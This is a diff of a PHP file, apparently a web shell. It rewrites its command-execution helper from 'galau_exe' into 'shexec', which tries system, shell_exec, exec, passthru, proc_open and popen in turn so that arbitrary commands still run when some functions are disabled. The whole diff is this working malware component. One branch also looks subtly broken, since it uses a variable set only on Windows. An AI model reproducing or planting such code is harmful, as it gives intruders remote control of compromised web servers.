@@ -226,70 +226,88 @@ function galau_rm($dirz){
 
 // -- End
 
-function galau_exe($x){
-	$x=$x.' 2>&1';
-	if(!is_null($backtic=`$x`))
-	{
-		return $backtic;
+function shexec($x, $win_tick = false){
+	if(DIRECTORY_SEPARATOR === "/"){
+		$x .= " 2>&1";
 	}
-	elseif(function_exists('system'))
-	{
+	
+	if(function_exists("system")){
 		ob_start();
-		$system=system($x);
-		$buff=ob_get_contents();
+		@system($x);
+		$out = ob_get_contents();
 		ob_end_clean();
-		return $buff;
+		return $out;
 	}
-	elseif(function_exists('exec'))
-	{
-		$buff="";
-		exec($x,$results);
-		foreach($results as $result)
-		{
-			$buff.=$result;
+	elseif(function_exists("shell_exec")){
+		return @shell_exec($x);
+	}
+	elseif(function_exists("exec")){
+		@exec($x, $outArr, $ret);
+		return implode(PHP_EOL, $outArr);
+	}
+	elseif(function_exists("passthru")){
+		ob_start();
+		@passthru($x, $ret);
+		$out = ob_get_contents();
+		ob_end_clean();
+		return $out;
+	}
+	elseif(function_exists("proc_open")){
+		$deskrip = array(
+			0 => array(
+				"pipe",
+				"r"
+			),
+			1 => array(
+				"pipe",
+				"w"
+			),
+			2 => array(
+				"pipe",
+				"w"
+			)
+		);
+		if(DIRECTORY_SEPARATOR === "\\"){
+			$old_tick = $x;
+			if($win_tick){
+				$old_tick = "C:\\Windows\\System32\\cmd.exe /C {$x}";
+			}
+			
+			$process = @proc_open($old_tick, $deskrip, $pipes, @getcwd(), null, array(
+				"suppress_errors" => false,
+				"bypass_shell" => true
+			));
+			if(!is_resource($process)){
+				$old_tick = $x;
+				$process = @proc_open($old_tick, $deskrip, $pipes, @getcwd(), null, array(
+					"suppress_errors" => false,
+					"bypass_shell" => true
+				));
+			}
 		}
-		return $buff;
-	}
-	elseif(function_exists('shell_exec'))
-	{
-		$buff=shell_exec($x);
-		return $buff;
-	}
-	elseif(function_exists('pcntl_exec'))
-	{
-		$buff=pcntl_exec($x);
-		return $buff;
-	}
-	elseif(function_exists('passthru'))
-	{
-		ob_start();		
-		$passthru=passthru($x);
-		$buff=ob_get_contents();
-		ob_end_clean();	
-		return $buff;
-	}
-	elseif(function_exists('proc_open'))
-	{
-		$proc=proc_open($x,array(
-			array("pipe","r"),
-			array("pipe","w"),
-			array("pipe","w")
-		),$pipes);
-		$buff=stream_get_contents($pipes[1]);
-		return $buff;
-	}
-	elseif(function_exists('popen'))
-	{
-		$buff="";
-		$pop=popen($x,"r");
-		while(!feof($pop))
-		{
-			$buff.=fread($pop,1024);
+		else {
+			$process = @proc_open($old_tick, $deskrip, $pipes, @getcwd());
 		}
-		pclose($pop);
-		return $buff;
+		
+		$out = "";
+		if(is_resource($process)){
+			fclose($pipes[0]);
+			$out = stream_get_contents($pipes[1]);
+			fclose($pipes[1]);
+			$err = stream_get_contents($pipes[2]);
+			$out .= $err;
+			fclose($pipes[2]);
+			$ret = proc_close($process);
+		}
+		return $out;
 	}
-	return "Sad Life :)";
+	elseif(function_exists("popen")){
+		$process = popen($x, "r");
+		$out = fread($process, 4096);
+		pclose($process);
+		return $out;
+	}
+	return "Every functions is inactive or disabled, sorry dudes :(";
 }
 
 function wcek($r, $s){
